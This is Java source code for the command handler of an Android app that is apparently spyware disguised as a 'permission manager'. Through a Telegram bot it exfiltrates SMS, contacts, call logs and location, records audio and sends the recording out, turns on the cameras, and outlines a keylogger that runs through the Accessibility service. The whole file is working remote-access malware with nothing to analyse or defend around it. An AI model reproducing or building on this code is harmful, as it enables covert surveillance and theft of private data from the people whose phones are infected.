package com.example.permissionmanagerpro.payload;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.pengrad.telegrambot.TelegramBot;
import com.pengrad.telegrambot.request.SendDocument;
import com.pengrad.telegrambot.request.SendMessage;

import java.io.File;
import java.util.List;

public class CommandHandler {
    private static final String TAG = "CommandHandler";
    private final Context context;
    private final TelegramBot bot;
    private final SessionManager sessionManager;

    public CommandHandler(Context context, TelegramBot bot, SessionManager sessionManager) {
        this.context = context;
        this.bot = bot;
        this.sessionManager = sessionManager;
    }

    public void handle(Long chatId, String command) {
        Log.d(TAG, "Handling: " + command + " from " + chatId);

        if (command.startsWith("/record")) {
            try {
                int secs = Integer.parseInt(command.replace("/record", "").trim());
                String path = FeatureUtils.startRecording(context, secs);
                sendDocument(chatId, new File(path), "تسجيل صوتي لمدة " + secs + " ثانية.");
            } catch (Exception e) { sendMessage(chatId, "خطأ: استخدم /record 30 (مثال)"); }
            return;
        }

        switch (command.toLowerCase()) {
            case "/start": sendMessage(chatId, "مرحباً بك في نظام التحكم.\nأرسل /help للأوامر."); break;
            case "/help": sendHelp(chatId); break;
            case "/devices":
                String devices = sessionManager.getDevices().toString();
                sendMessage(chatId, "الأجهزة المسجلة: " + (devices.isEmpty() ? "لا يوجد" : devices));
                break;
            case "/dumpsms": sendMessage(chatId, FeatureUtils.dumpSms(context)); break;
            case "/dumpcontacts": sendMessage(chatId, FeatureUtils.dumpContacts(context)); break;
            case "/dumpcallog": sendMessage(chatId, FeatureUtils.dumpCallLog(context)); break;
            case "/dumpimgs":
                List<String> imgs = FeatureUtils.getImagePaths(context);
                sendMessage(chatId, "تم العثور على " + imgs.size() + " صورة. (يمكنك تحميلها يدوياً لاحقاً)");
                break;
            case "/getloc": sendMessage(chatId, FeatureUtils.getLocation(context)); break;
            case "/camera_front":
            case "/camera_back":
                Intent camIntent = new Intent(context, CameraService.class);
                camIntent.putExtra("camera_side", command.equals("/camera_front") ? "front" : "back");
                context.startForegroundService(camIntent);
                sendMessage(chatId, "📸 تم تشغيل الكاميرا (" + command + ")");
                break;
            case "/stop_camera":
                context.stopService(new Intent(context, CameraService.class));
                sendMessage(chatId, "⏹️ تم إيقاف الكاميرا.");
                break;
            case "/keylogger_start":
                sendMessage(chatId, "⚠️ يرجى تفعيل خدمة الإمكانية يدوياً من الإعدادات، ثم سيبدأ التسجيل.");
                // سيتم تفعيلها عبر Accessibility.
                break;
            case "/keylogger_stop":
                sendMessage(chatId, "⏹️ تم إيقاف التسجيل (افتراضياً).");
                break;
            case "/keylogger_dump":
                sendMessage(chatId, "📋 سيتم إرسال الملف لاحقاً (نفذ هذا يدوياً عبر الكود)");
                break;
            default: sendMessage(chatId, "أمر غير معروف. استخدم /help");
        }
    }

    private void sendMessage(Long chatId, String text) {
        if (chatId == null || text == null) return;
        try { bot.execute(new SendMessage(chatId, text)); } catch (Exception e) { e.printStackTrace(); }
    }

    private void sendDocument(Long chatId, File file, String caption) {
        if (!file.exists()) return;
        try { bot.execute(new SendDocument(chatId, file).caption(caption)); } catch (Exception e) { e.printStackTrace(); }
    }

    private void sendHelp(Long chatId) {
        String help = """
                /devices - عرض الأجهزة
                /dumpsms - تفريغ الرسائل
                /dumpcontacts - تفريغ جهات الاتصال
                /dumpcallog - تفريغ سجل المكالمات
                /dumpimgs - تفريغ الصور
                /getloc - الموقع
                /record 30 - تسجيل صوتي (30 ثانية)
                /camera_front - تشغيل الكاميرا الأمامية
                /camera_back - تشغيل الكاميرا الخلفية
                /stop_camera - إيقاف الكاميرا
                /keylogger_start - بدء التسجيل
                /keylogger_stop - إيقاف التسجيل
                /keylogger_dump - تفريغ الضغطات
                """;
        sendMessage(chatId, help);
    }
}